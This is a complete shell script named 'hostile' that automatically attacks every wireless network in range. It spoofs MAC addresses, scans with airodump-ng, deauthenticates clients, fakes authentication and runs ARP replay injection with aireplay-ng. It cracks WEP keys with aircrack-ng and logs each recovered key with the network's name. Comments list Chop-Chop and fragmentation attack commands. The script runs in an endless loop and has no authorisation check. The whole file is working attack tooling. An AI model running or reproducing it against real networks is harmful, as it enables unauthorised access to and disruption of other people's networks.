#!/bin/sh

H_ME=${0##*/}
H_MY_D=${0%/*}
H_MY_D=$(cd $H_MY_D; pwd)
H_MY_PID=$$
H_VERSION="0.2"

h_usage() {
	cat << _END_OF_USAGE_

Usage: $H_ME OPTIONS

Scan its wireless environment and try to "play" with it

Options:
	-b,--bssid BSSID      restrict exploration to the specified BSSID
	-c,--channel CHANNEL  restrict exploration to the specified channel
	-m,--mac MAC          use specified hardware MAC address
	                      (use auto to get a random one)
	-L,--log-file FILE    log activity to the specified file
	-R,--run-dir DIR      use the specified directory for storage

	-V,--version          display program version and exit
	-h,--help             display program usage and exit

_END_OF_USAGE_
}

h_version() {
	cat << _END_OF_VERSION_
$H_ME v$H_VERSION, Copyright (C) /tmp/lap <contact@tmplab.org>
_END_OF_VERSION_
}

h_error() {
	echo "$H_ME: $@"
	exit 1
}

if [ -f /etc/hostile.conf ]; then
	H_CONFIG_F=/etc/hostile.conf
	H_LOG_F=/var/log/hostile.log
	H_RUN_D=/var/run/hostile
elif [ -f /mnt/usbdrive/hostile.conf ]; then
	H_CONFIG_F=/mnt/usbdrive/hostile.conf
	H_LOG_F=/mnt/usbdrive/hostile.log
	H_RUN_D=/mnt/usbdrive/hostile-run.d
else
	if [ -f $H_MY_D/hostile.conf ]; then
		H_CONFIG_F=$H_MY_D/hostile.conf
	fi
	H_LOG_F=$H_MY_D/hostile.log
	H_RUN_D=$H_MY_D/hostile-run.d
fi

H_CAPTURE_IV_ONLY=1
H_CRACK_TIME_LIMIT=600
#H_INJECTION_RATE_LIMIT=150
H_INJECTION_TIME_LIMIT=300
H_IV_MIN=40000
H_IV_MAX=150000
H_IV_RATE_SUCCESS=10
H_MONITOR_TIME_LIMIT=30
H_REFRESH_DELAY=20

H_WIFI_IF=wifi0
H_STA_IF=ath0
H_AP_IF=ath1
H_MON_IF=ath2

h_get_options() {
	while [ -n "$1" ]; do
		case $1 in
			-b|--bssid)
				shift
				H_OPT_BSSID=$1
				;;
			-c|--channel)
				shift
				H_OPT_CHANNEL=$1
				;;
			-m|--mac|--hwaddr)
				shift
				H_OPT_MAC=$1
				;;
			-C|--config-file)
				shift
				H_OPT_CONFIG_F=$1
				;;
			-L|--log-file)
				shift
				H_OPT_LOG_F=$1
				;;
			-D|--run_dir)
				shift
				H_OPT_RUN_D=$1
				;;
			--iv-only)
				shift
				H_OPT_CAPTURE_IV_ONLY=1
				;;
			--no-iv-only)
				H_OPT_CAPTURE_IV_ONLY=0
				;;
			--crack-time-limit)
				shift
				H_OPT_CRACK_TIME_LIMIT=$1
				;;
			--injection-rate-limit)
				shift
				H_OPT_INJECTION_RATE_LIMIT=$1
				;;
			--no-injection-rate-limit)
				H_OPT_INJECTION_RATE_LIMIT=0
				;;
			--injection-time-limit)
				shift
				H_OPT_INJECTION_TIME_LIMIT=$1
				;;
			--iv-min)
				shift
				H_OPT_IV_MIN=$1
				;;
			--iv-max)
				shift
				H_OPT_IV_MAX=$1
				;;
			--monitor-time-limit)
				shift
				H_OPT_MONITOR_TIME_LIMIT=$1
				;;
			-h|--help)
				h_usage
				exit 0
				;;
			-V|--version)
				h_version
				exit 0
				;;
			*)
				h_error "unknown option '$1'"
				exit 1
				;;
		esac
		shift
	done
}

h_now() {
	date +%s
}

h_log() {
	local time_now=$(h_now)
	local time_elapsed=$(($time_now - $H_TIME_START))
	local time_str=$(date +%T -d 0:0:$time_elapsed)
	echo "$H_ME [$time_str]: $@" >>$H_LOG_F
}

h_init() {
	H_TIME_START=$(h_now)
	[ -n "$H_OPT_CONFIG_F" ] \
		&& H_CONFIG_F=$H_OPT_CONFIG_F
	[ -r $H_CONFIG_F ] \
		&& source $H_CONFIG_F \
		|| h_error "can't read config file '$H_CONFIG_F'"
	[ -n "$H_OPT_LOG_F" ] \
		&& H_LOG_F=$H_OPT_LOG_F
	[ -n "$H_OPT_RUN_D" ] \
		&& H_RUN_D=$H_OPT_RUN_D
	[ -n "$H_OPT_CAPTURE_IV_ONLY" ] \
		&& H_CAPTURE_IV_ONLY=$H_OPT_CAPTURE_IV_ONLY
	[ -n "$H_OPT_CRACK_TIME_LIMIT" ] \
		&& H_CRACK_TIME_LIMIT=$H_OPT_CRACK_TIME_LIMIT
	[ -n "$H_OPT_INJECTION_RATE_LIMIT" ] \
		&& H_INJECTION_RATE_LIMIT=$H_OPT_INJECTION_RATE_LIMIT
	[ -n "$H_OPT_H_INJECTION_TIME_LIMIT" ] \
		&& H_INJECTION_TIME_LIMIT=$H_OPT_H_INJECTION_TIME_LIMIT
	[ -n "$H_OPT_H_IV_MIN" ] \
		&& H_IV_MIN=$H_OPT_H_IV_MIN
	[ -n "$H_OPT_H_IV_MAX" ] \
		&& H_IV_MAX=$H_OPT_H_IV_MAX
	[ -n "$H_OPT_H_IV_RATE_SUCCESS" ] \
		&& H_IV_RATE_SUCCESS=$H_OPT_IV_RATE_SUCCESS
	[ -n "$H_OPT_MONITOR_TIME_LIMIT" ] \
		&& H_MONITOR_TIME_LIMIT=$H_OPT_MONITOR_TIME_LIMIT
	touch $H_LOG_F >/dev/null 2>&1 \
		|| h_error "can't create log file '$H_LOG_F'"
	h_log "started"
	h_log "using config file: $H_CONFIG_F"
	[ -d $H_RUN_D ] \
		|| mkdir -p $H_RUN_D >/dev/null 2>&1 \
		|| h_error "can't create run directory '$H_RUN_D'"
	cd $H_RUN_D >/dev/null 2>&1 \
		|| h_error "can't use run temp directory '$H_RUN_D'"
	H_WEP_F=$H_RUN_D/hostile-wep.txt
	touch $H_WEP_F >/dev/null 2>&1 \
		|| h_error "can't create wep key file '$H_WEP_F'"
	H_RUN_D=$(mktemp -d $H_RUN_D/hostile-XXXXXX) \
		|| h_error "can't create temp run directory in '$H_RUN_D'"
	cd $H_RUN_D >/dev/null 2>&1 \
		|| h_error "can't use run temp directory '$H_RUN_D'"
	h_log "using temp directory: $H_RUN_D"
}

h_fini() {
	h_log "ended"
}

H_LED_SUCCESS=gpio4
H_LED_WIP=gpio7

h_led_on() {
	local led=$1
	echo "none" > /sys/class/leds/$led/trigger
	echo 255 > /sys/class/leds/$led/brightness
}

h_led_blink() {
	local led=$1
	local delay=$2
	echo "timer" > /sys/class/leds/$led/trigger
	echo $delay > /sys/class/leds/$led/delay_on
	echo $delay > /sys/class/leds/$led/delay_off
}

h_led_off() {
	local led=$1
	echo "none" > /sys/class/leds/$led/trigger
	echo 0 > /sys/class/leds/$led/brightness
}


h_mac_get() {
	local IF=$1
	macchanger --show $IF | sed -e 's,\(.*\) \([0-9a-f\]\+:[0-9a-f]\+:[0-9a-f]\+:[0-9a-f]\+:[0-9a-f]\+:[0-9a-f]\+\) \(.*\),\2,' 2>/dev/null || \
		h_error "can't get '$IF' mac address"
}

h_mac_set() {
	local IF=$1
	local MAC=$2
	local opt
	case $MAC in
		auto)
			opt="-r"
			;;
		*)
			opt="-m $MAC"
	esac
	ifconfig $IF down
	macchanger $opt $IF >/dev/null 2>&1 || \
		h_error "can't set '$IF' mac address to '$MAC'"
}

h_hw_init() {
	[ -n "$H_MAC" ] && {
		H_MAC_OLD=$(h_mac_get $H_WIFI_IF)
		h_mac_set $H_WIFI_IF $H_MAC
	}
	H_MAC=$(h_mac_get $H_WIFI_IF)
	h_log "using interface: $H_WIFI_IF, mac address: $H_MAC"

	wlanconfig $H_STA_IF create wlandev $H_WIFI_IF wlanmode sta nosbeacon >/dev/null 2>&1 || \
		h_log "can't create sta ($H_STA_IF) interface"

	wlanconfig $H_AP_IF create wlandev $H_WIFI_IF wlanmode ap nosbeacon >/dev/null 2>&1 || \
		h_log "can't create sta ($H_AP_IF) interface"

	wlanconfig $H_MON_IF create wlandev $H_WIFI_IF wlanmode monitor >/dev/null 2>&1 || \
		h_log "can't create monitor ($H_MON_IF) interface"
	
	h_log "using $H_STA_IF for sta, $H_AP_IF for ap & $H_MON_IF for monitor"

	h_led_off $H_LED_SUCCESS
	h_led_blink $H_LED_WIP 500
}

h_hw_fini() {
	ifconfig $H_MON_IF down
	sleep 1
	wlanconfig $H_MON_IF destroy >/dev/null 2>&1

	ifconfig $H_AP_IF down
	sleep 1
	wlanconfig $H_AP_IF destroy >/dev/null 2>&1

	ifconfig $H_STA_IF down
	sleep 1
	wlanconfig $H_STA_IF destroy >/dev/null 2>&1

	[ -n "$H_MAC_OLD" ] && {
		h_mac_set $H_WIFI_IF $H_MAC_OLD
	}
	
	h_led_off $H_LED_SUCCESS
	h_led_off $H_LED_WIP
}


h_csv_get() {
	local F=$1
	local bssid=$2
	cat $F 2>/dev/null | tail -n +3 | grep "^$bssid,"
}

h_csv_get_network_iv_count() {
	local F=$1
	local bssid=$2
	local v=$(h_csv_get $F $bssid | awk -F\, '{ print $11; }')
	[ -z "$v" ] && v=0
	echo $v
}

h_csv_get_network_sta() {
	local F=$1
	local bssid=$2
	cat $F 2>/dev/null | grep "^.*,.*,.*,.*,.*, $bssid" | awk -F\, '{ print $1; }'
}


h_kis_get() {
	local F=$1
	cat $F 2>/dev/null | tail -n +2 | grep "^.*;infra"
}

h_kis_get_networks() {
	local F=$1
	h_kis_get $F | awk -F\; '{ print $22 "\;" $8 "\;" $1; }' | sort -n -r
}

h_kis_get_networks_by_enc() {
	local F=$1
	local E=$2
	h_kis_get_networks $F | grep "^.*;$E" | awk -F\; '{ print $3; }'
}

h_kis_get_network_bssid() {
	local F=$1
	local N=$2
	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $4; }'
}

h_kis_get_network_channel() {
	local F=$1
	local N=$2
	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $6; }'
}

h_kis_get_network_essid() {
	local F=$1
	local N=$2
	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $3; }'
}

h_kis_get_network_max_rate() {
	local F=$1
	local N=$2
	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $10; }' | awk -F. '{ print $1; }'
}


h_capture() {
	local file=$1
	local bssid=$2
	local channel=$3
	local opt=$4
	local cmd="airodump-ng"
	[ -n "$file" ] && cmd="$cmd --write $file"
	[ -n "$bssid" ] && cmd="$cmd --bssid $bssid"
	[ -n "$channel" ] && cmd="$cmd --channel $channel"
	cmd="$cmd $H_MON_IF $opt"
	h_log "running: $cmd"
	exec $cmd
}

h_auth_start() {
	[ -z "$H_AUTH_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_AUTH_PID=$!
	H_AUTH_TIME_STARTED=$(h_now)
	return 0
}

h_auth_stop() {
	[ -n "$H_AUTH_PID" ] || return 1
	kill -TERM $H_AUTH_PID 2>/dev/null
	unset H_AUTH_TIME_STARTED
	unset H_AUTH_PID
	return 0
}


h_capture_start() {
	[ -z "$H_CAPTURE_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_CAPTURE_PID=$!
	H_CAPTURE_TIME_STARTED=$(h_now)
	return 0
}

h_capture_stop() {
	[ -n "$H_CAPTURE_PID" ] || return 1
	kill -TERM $H_CAPTURE_PID 2>/dev/null
	unset H_CAPTURE_TIME_STARTED
	unset H_CAPTURE_PID
	return 0
}


h_crack_start() {
	[ -z "$H_CRACK_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_CRACK_PID=$!
	H_CRACK_TIME_STARTED=$(h_now)
	return 0
}

h_crack_stop() {
	[ -n "$H_CRACK_PID" ] || return 1
	kill -TERM $H_CRACK_PID 2>/dev/null
	unset H_CRACK_TIME_STARTED
	unset H_CRACK_PID
	return 0
}


h_replay_start() {
	[ -z "$H_REPLAY_PID" ] || return 1
	$@ >/dev/null 2>&1 &
	H_REPLAY_PID=$!
	H_REPLAY_TIME_STARTED=$(h_now)
	return 0
}

h_replay_stop() {
	[ -n "$H_REPLAY_PID" ] || return 1
	kill -TERM $H_REPLAY_PID 2>/dev/null
	unset H_REPLAY_TIME_STARTED
	unset H_REPLAY_PID
	return 0
}


h_monitor_all() {
	h_log "monitoring traffic for $H_MONITOR_TIME_LIMIT seconds"
	
	ifconfig $H_MON_IF down
	iwconfig $H_MON_IF channel 0

	H_CSV_ALL_F=ALL-01.csv
	H_KIS_ALL_F=ALL-01.kismet.csv
	h_capture_start h_capture ALL "$H_OPT_BSSID" "$H_OPT_CHANNEL"
	sleep $H_MONITOR_TIME_LIMIT
	h_capture_stop

	H_NET_OPEN_F=ALL-OPEN.txt
	H_NET_WEP_F=ALL-WEP.txt
	H_NET_WPA_F=ALL-WPA.txt
	h_kis_get_networks_by_enc $H_KIS_ALL_F "O" >$H_NET_OPEN_F
	h_kis_get_networks_by_enc $H_KIS_ALL_F "WEP" >$H_NET_WEP_F
	h_kis_get_networks_by_enc $H_KIS_ALL_F "WPA" >$H_NET_WPA_F

	local n_open=$(wc -l <$H_NET_OPEN_F)
	local n_wep=$(wc -l <$H_NET_WEP_F)
	local n_wpa=$(wc -l <$H_NET_WPA_F)
	h_log "found $n_open open, $n_wep WEP & $n_wpa WPA networks"
}


#
# handle open networks
#

h_open_try_one_network() {
	local N=$1
	local bssid=$(h_kis_get_network_bssid $H_KIS_ALL_F $N)
	local channel=$(h_kis_get_network_channel $H_KIS_ALL_F $N)
	local essid=$(h_kis_get_network_essid $H_KIS_ALL_F $N)
	h_log "found open network: bssid='$bssid', essid='$essid', channel=$channel"
}

h_open_try_all_networks() {
	for N in $(cat $H_NET_OPEN_F); do
		h_open_try_one_network $N
	done
}


#
# handle WEP networks
#

h_wep_log_key() {
	local key=$(cat $H_KEY_CUR_F)
	h_led_on $H_LED_SUCCESS
	h_log "key found: $key"
	echo "$H_CUR_BSSID,$H_CUR_ESSID,$key" >>$H_WEP_F
}

h_wep_attack_is_working() {
	local bssid=$1
	local iv
	local iv_last
	local time
	local time_last
	local time_start
	local time_elapsed
	local div
	local dtime
	local iv_rate

	time_start=$(h_now)
	iv_last=$(h_csv_get_network_iv_count $H_CSV_CUR_F $bssid)
	time_last=$(h_now)
	while [ 1 ]; do
		sleep $H_REFRESH_DELAY
		time=$(h_now)
		time_elapsed=$(($time - $time_start))
		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
		iv=$(h_csv_get_network_iv_count $H_CSV_CUR_F $bssid)
		div=$(($iv - $iv_last))
		dtime=$(($time - $time_last))
		iv_rate=$(($div / $dtime))
		h_log "got $iv IVs so far ($div IVs in $dtime seconds, $iv_rate IVs/s)"
		[ $iv_rate -ge $H_IV_RATE_SUCCESS ] && return 0
		iv_last=$iv
		time_last=$time
	done
	return 1
}

h_wep_attack_try() {
	local replay_func=$1
	local auth_func=$2
	local bssid=$H_CUR_BSSID
	local essid=$H_CUR_ESSID
	local client=$H_CUR_CLIENT
	local iv
	local crack_time_started
	local RC=1
	
	[ -n "$replay_func" ] && h_replay_start $replay_func $bssid $client
	[ -n "$auth_func" ] && [ -z "$client" ] && h_auth_start $auth_func $bssid $essid

	if h_wep_attack_is_working $bssid; then
		h_log "attack seems to be working \o/ :)"
		h_led_blink $H_LED_WIP 100
		while [ 1 ]; do
			iv=$(h_csv_get_network_iv_count $H_CSV_CUR_F $bssid)
			if [ $iv -ge $H_IV_MIN ]; then
				if [ $iv -ge $H_IV_MAX ]; then
					h_log "max IVs limit ($H_IV_MAX) reached"
					break
				fi
				if [ -z "$crack_time_started" ]; then
					h_log "min IVs limit ($H_IV_MIN) reached"
					h_crack_start h_wep_crack $bssid 
					crack_time_started=$(h_now)
				else
					local crack_time=$(h_now)
					local crack_time_elapsed=$(($crack_time - $crack_time_started))
					if [ $crack_time_elapsed -ge $H_CRACK_TIME_LIMIT ]; then
						h_log "cracking time limit ($H_CRACK_TIME_LIMIT) reached"
						break
					fi
				fi
			fi
			if [ -f $H_KEY_CUR_F ]; then
				h_wep_log_key
				RC=0
				break
			fi
			if ! h_wep_attack_is_working $bssid; then
				h_log "attack stalled, aborting"
				break
			fi
		done
	fi

	h_crack_stop
	h_auth_stop
	h_replay_stop

	return $RC
}

h_wep_crack() {
	local bssid=$1
	local cmd="aircrack-ng -q -b $bssid -l $H_KEY_CUR_F $H_CAP_CUR_F"
	h_log "running: $cmd"
	exec $cmd
}

h_wep_deauth() {
	local cmd="aireplay-ng $H_MON_IF -0 1 -a $H_CUR_BSSID -c $H_CUR_CLIENT"
	h_log "running: $cmd"
	$cmd
}

h_wep_auth() {
	local bssid=$1
	shift
	local essid=$1
	shift
	local opt="$*"
	local cmd="aireplay-ng $H_MON_IF -a $bssid -e \"$essid\" $opt"
	h_log "running: $cmd"
	exec $cmd
}

h_wep_auth_fake1() {
	local bssid=$1
	local essid=$2
	h_wep_auth "$bssid" "$essid" -1 6000 -o 1 -q 10
}

h_wep_auth_fake2() {
	local bssid=$1
	local essid=$2
	h_wep_auth "$bssid" "$essid" -1 0 
}

h_wep_auth_fake3() {
	local bssid=$1
	local essid=$2
	h_wep_auth "$bssid" "$essid" -1 5 -o 10 -q 1
}

# Chop-Chop
#aireplay-ng ath1 --chopchop -F -b AP -h STA
#packetforge-ng -0 -a AP -h STA -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-*.xor -w p.cap
#aireplay-ng ath1 --interactive -F -h STA -r p.cap

# Fragmentation Attack
#aireplay-ng ath1 -5 -b AP -h STA -k TARGET -l SOURCE
#packetforge-ng -0 -a AP -h STA -k TARGET -l SOURCE -y replay_dec-*.xor -w p.cap
#aireplay-ng ath1 --interactive -F -h STA -r p.cap

h_wep_replay() {
	local bssid=$1
	shift
	local opt="$*"
	local cmd="aireplay-ng $H_MON_IF -b $bssid $opt"
	[ -n "$H_INJECTION_RATE_LIMIT" -a $H_INJECTION_RATE_LIMIT -gt 0 ] \
		cmd="$cmd -x $H_INJECTION_RATE_LIMIT"
	h_log "running: $cmd"
	exec $cmd
}

h_wep_replay_arp1() {
	local bssid=$1
	local client=$2
	h_wep_replay "$bssid" -3 -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ${client:+-h $client}
}

h_wep_replay_arp2() {
	local bssid=$1
	local client=$2
	h_wep_replay "$bssid" -2 -c FF:FF:FF:FF:FF:FF -p 0841 -F ${client:+-h $client}
}

h_wep_replay_caffe_latte() {
	local bssid=$1
	h_wep_replay "$bssid" -6 -D
}

h_wep_replay_hilte() {
	local bssid=$1
	h_wep_replay "$bssid" -7 -D
}

h_wep_try_arp_replay_1() {
	h_log "trying ARP replay attack (1)"
	h_wep_attack_try "h_wep_replay_arp1" "h_wep_auth_fake1"
	return $?
}

h_wep_try_arp_replay_2() {
	h_log "trying ARP replay attack (2)"
	h_wep_attack_try "h_wep_replay_arp2" "h_wep_auth_fake1"
	return $?
}

h_wep_try_caffe_latte() {
	h_log "trying Caffe-Latte"
	h_wep_attack_try "h_wep_replay_caffe_latte" "h_wep_auth_fake1"
	return $?
}

h_wep_try_hilte() {
	h_log "trying Hilte"
	h_wep_attack_try "h_wep_replay_hilte" "h_wep_auth_fake1"
	return $?
}

H_ATTACKS_WITH_STA=" \
	h_wep_try_arp_replay_1 \
	h_wep_try_arp_replay_2 \
"

H_ATTACKS_WITHOUT_STA=" \
	h_wep_try_arp_replay_1 \
	h_wep_try_arp_replay_2 \
"

h_wep_try_one_network() {
	local N=$1
	H_CUR_BSSID=$(h_kis_get_network_bssid $H_KIS_ALL_F $N)
	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_KIS_ALL_F $N)
	H_CUR_ESSID=$(h_kis_get_network_essid $H_KIS_ALL_F $N)
	H_CUR_CLIENT=$(h_csv_get_network_sta $H_CSV_ALL_F $H_CUR_BSSID | head -n 1)
	H_CUR_RATE=$(h_kis_get_network_max_rate $H_KIS_ALL_F $N)
	local h_capture_options

	if grep -q "^$H_CUR_BSSID," $H_WEP_F; then
		h_log "skipping known WEP network: bssid='$H_CUR_BSSID', essid='$H_CUR_ESSID'"
		return 0
	fi

	h_log "trying WEP network: bssid='$H_CUR_BSSID', essid='$H_CUR_ESSID'"
	
	ifconfig $H_MON_IF down

	h_log "locking to channel: $H_CUR_CHANNEL"
	iwconfig $H_MON_IF channel $H_CUR_CHANNEL

	[ $H_CUR_RATE -le 11 ] && rate="11M" || rate="54M"
	h_log "ajusting bit rate to: $rate"
	iwconfig $H_MON_IF rate $rate

	if [ -n "$H_CUR_CLIENT" ]; then
		h_log "found a client station: $H_CUR_CLIENT"
		attacks=$H_ATTACKS_WITH_STA
		h_mac_set $H_MON_IF $H_CUR_BSSID
		h_wep_deauth
		h_mac_set $H_MON_IF $H_CUR_CLIENT
	else
		h_log "no client station found"
		attacks=$H_ATTACKS_WITHOUT_STA
	fi
	
	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
		H_CAP_CUR_F="$H_CUR_BSSID-01.ivs"
		h_capture_options="--ivs"
	else
		H_CAP_CUR_F="$H_CUR_BSSID-01.cap"
	fi
	H_KIS_CUR_F="$H_CUR_BSSID-01.kismet.csv"
	H_CSV_CUR_F="$H_CUR_BSSID-01.csv"
	H_KEY_CUR_F="$H_CUR_BSSID-01.key"
	h_capture_start h_capture $H_CUR_BSSID $H_CUR_BSSID $H_CUR_CHANNEL $h_capture_options
	
	for attack in $attacks; do
		$attack && break
	done
	
	h_capture_stop
}

h_wep_try_all_networks() {
	for N in $(cat $H_NET_WEP_F); do
		h_wep_try_one_network $N
	done
}


h_abort() {
	h_auth_stop
	h_crack_stop
	h_replay_stop
	h_capture_stop
	sleep 1
	h_hw_fini
	h_log "aborted"
	exit 1
}
trap h_abort INT TERM

h_get_options $@
h_init
h_hw_init
while [ 1 ]; do
	h_monitor_all
	h_open_try_all_networks
	h_wep_try_all_networks
done
h_hw_fini
h_fini
